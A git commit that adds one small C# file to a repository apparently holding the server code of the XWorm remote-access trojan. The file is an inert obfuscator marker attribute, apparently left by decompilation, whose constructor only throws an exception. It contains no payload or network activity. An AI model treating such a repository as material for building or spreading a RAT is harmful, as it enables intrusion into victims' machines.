3534347be446568a04a2cb5b722fe6c5728b8673
h1ercarbohydratemap11 <xcytrizen@outlook.com>
2025-09-18 13:53:04 +0400

    ByXeno.cs

---
+++ XWorm V5.6/Server/Xeno/ByXeno.cs
@@ -0,0 +1,14 @@
+﻿using System;
+using System.Runtime.CompilerServices;
+using System.Runtime.InteropServices;
+
+internal class Xenocode\u002EClient\u002EAttributes\u002EAssemblyAttributes\u002EProcessedByXenocode : 
+  Attribute
+{
+  [MethodImpl(MethodImplOptions.NoInlining)]
+  public Xenocode\u002EClient\u002EAttributes\u002EAssemblyAttributes\u002EProcessedByXenocode(
+    [In] string obj0)
+  {
+    throw new Exception("さ");
+  }
+}
